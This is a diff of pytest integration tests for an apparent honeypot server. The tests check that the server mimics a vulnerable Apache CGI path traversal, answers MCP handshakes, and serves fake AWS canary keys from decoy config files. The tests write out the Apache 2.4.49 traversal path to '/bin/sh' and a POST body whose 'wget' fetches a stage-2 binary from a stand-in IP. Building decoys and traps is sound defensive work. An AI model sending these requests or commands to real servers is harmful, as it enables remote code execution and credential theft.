@@ -12,6 +12,7 @@ import json
 
 import aiohttp
 import pytest
+from yarl import URL
 
 from flux import server as tbenv
 
@@ -815,3 +816,165 @@ async def test_integration_fake_git_autoindex_never_drips(live_server, monkeypat
     entries = [json.loads(line) for line in log_path.read_text().splitlines()]
     assert not [e for e in entries if e.get("result") == "fake-git-capacity"]
     assert tbenv._active_slow_drips == 1
+
+
+async def test_integration_cgi_traversal_rce_probe_returns_500(live_server):
+    """A bodyless traversal to `/bin/sh` gets the 500 a genuinely
+    vulnerable 2.4.49 returns (`sh` exits before emitting CGI headers).
+    404 here would tell the scanner "patched" and it would never send
+    the POST that carries the command."""
+    base, log_path = live_server
+    target = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+    async with aiohttp.ClientSession() as session:
+        async with session.get(
+            URL(f"{base}{target}", encoded=True),
+            headers={"X-Forwarded-For": "203.0.113.41"},
+        ) as resp:
+            assert resp.status == 500
+            body = await resp.read()
+            assert b"Internal Server Error" in body
+
+    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
+    rows = [e for e in entries if e.get("result") == "cgi-traversal-rce-probe"]
+    assert rows, "no probe row logged"
+    # `path` has been normalised to /bin/sh — the CVE shape only survives
+    # in the raw-target field, which is the whole reason it is logged.
+    assert rows[-1]["cgiTraversalRawTarget"] == target
+    assert rows[-1]["cgiTraversalHasCommand"] is False
+
+
+async def test_integration_cgi_traversal_rce_captures_command_and_urls(live_server):
+    """The POST carrying the mod_cgi preamble is the payload-bearing
+    request: the command, its stage-2 URL and the downloader it reaches
+    for all land in structured fields, and the response is plausible
+    command output so a second command follows."""
+    base, log_path = live_server
+    target = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+    async with aiohttp.ClientSession() as session:
+        async with session.post(
+            URL(f"{base}{target}", encoded=True),
+            headers={"X-Forwarded-For": "203.0.113.42"},
+            data=b"echo Content-Type: text/plain; echo; wget http://198.51.100.9/x86 -O /tmp/x; id",
+        ) as resp:
+            assert resp.status == 200
+            body = await resp.read()
+
+    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
+    rows = [e for e in entries if e.get("result") == "cgi-traversal-rce-command"]
+    assert rows, "no command row logged"
+    row = rows[-1]
+    assert row["cgiTraversalHasCommand"] is True
+    assert row["cgiTraversalCommand"].startswith("wget http://198.51.100.9/x86")
+    assert "http://198.51.100.9/x86" in row["cgiTraversalPayloadUrls"]
+    assert "wget" in row["cgiTraversalDownloaders"]
+    assert row["cgiTraversalRawTarget"] == target
+
+
+async def test_integration_mcp_get_with_sse_accept_opens_stream(live_server):
+    """Streamable HTTP serves the server-to-client stream from a GET on
+    the JSON-RPC endpoint. 405 there ends the walk before the POST that
+    carries `tools/call`."""
+    base, log_path = live_server
+    async with aiohttp.ClientSession() as session:
+        async with session.get(
+            f"{base}/mcp",
+            headers={"X-Forwarded-For": "203.0.113.43", "Accept": "text/event-stream"},
+        ) as resp:
+            assert resp.status == 200
+            assert resp.headers["Content-Type"].startswith("text/event-stream")
+            assert b"event: endpoint" in await resp.read()
+
+    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
+    assert any(e.get("result") == "mcp-server-stream-handshake" for e in entries)
+
+
+async def test_integration_mcp_get_without_sse_accept_still_405s(live_server):
+    """A plain GET is not a transport handshake — a real server rejects it,
+    and matching that keeps the surface honest."""
+    base, log_path = live_server
+    async with aiohttp.ClientSession() as session:
+        async with session.get(
+            f"{base}/mcp", headers={"X-Forwarded-For": "203.0.113.44"},
+        ) as resp:
+            assert resp.status == 405
+
+    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
+    assert any(e.get("result") == "mcp-server-method-not-allowed" for e in entries)
+
+
+async def test_integration_api_mcp_alias_dispatches(live_server):
+    """Gateway-mounted alias reaches the same JSON-RPC handler."""
+    base, log_path = live_server
+    async with aiohttp.ClientSession() as session:
+        async with session.post(
+            f"{base}/api/mcp",
+            headers={"X-Forwarded-For": "203.0.113.45"},
+            json={"jsonrpc": "2.0", "id": 1, "method": "tools/list"},
+        ) as resp:
+            assert resp.status == 200
+            payload = await resp.json()
+            assert payload.get("jsonrpc") == "2.0"
+
+
+async def test_integration_aws_exports_js_serves_canary(live_server):
+    """Amplify's generated bundle artifact carries the canary triple in the
+    fields a grep-based harvester filters on."""
+    base, log_path = live_server
+    async with aiohttp.ClientSession() as session:
+        async with session.get(
+            f"{base}/aws-exports.js", headers={"X-Forwarded-For": "203.0.113.46"},
+        ) as resp:
+            assert resp.status == 200
+            body = await resp.read()
+            assert b"AKIAFAKEINTEG01" in body
+            assert b"const awsmobile" in body
+
+    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
+    assert any(e.get("result") == "aws-amplify-exports-js" for e in entries)
+
+
+async def test_integration_serverless_yml_serves_canary(live_server):
+    base, log_path = live_server
+    async with aiohttp.ClientSession() as session:
+        async with session.get(
+            f"{base}/serverless.yml", headers={"X-Forwarded-For": "203.0.113.47"},
+        ) as resp:
+            assert resp.status == 200
+            body = await resp.read()
+            assert b"AKIAFAKEINTEG01" in body
+            assert b"provider:" in body
+
+    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
+    assert any(e.get("result") == "serverless-config" for e in entries)
+
+
+async def test_integration_service_account_key_names_serve_canary(live_server):
+    """The bare-filename service-account dictionary a credential harvester
+    walks when it cannot know the project's naming convention."""
+    base, log_path = live_server
+    async with aiohttp.ClientSession() as session:
+        for path in ["/key.json", "/serviceAccountKey.json", "/amplifyconfiguration.json"]:
+            async with session.get(
+                f"{base}{path}", headers={"X-Forwarded-For": "203.0.113.48"},
+            ) as resp:
+                assert resp.status == 200, path
+                assert b"AKIAFAKEINTEG01" in await resp.read(), path
+
+
+async def test_integration_vite_fs_resolves_new_cloud_artifacts(live_server):
+    """The `/@fs/` resolver walks the same exact-path trap table, so every
+    path added to the dictionary closes on the arbitrary-read surface too
+    — the surface a dev-server file-read sweep actually uses."""
+    base, log_path = live_server
+    async with aiohttp.ClientSession() as session:
+        async with session.get(
+            f"{base}/@fs/app/aws-exports.js?raw??",
+            headers={"X-Forwarded-For": "203.0.113.49"},
+        ) as resp:
+            assert resp.status == 200
+            assert b"AKIAFAKEINTEG01" in await resp.read()
+
+    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
+    assert any(
+        e.get("result") == "vite-fs-aws-amplify-exports-js" for e in entries
+    ), [e.get("result") for e in entries]
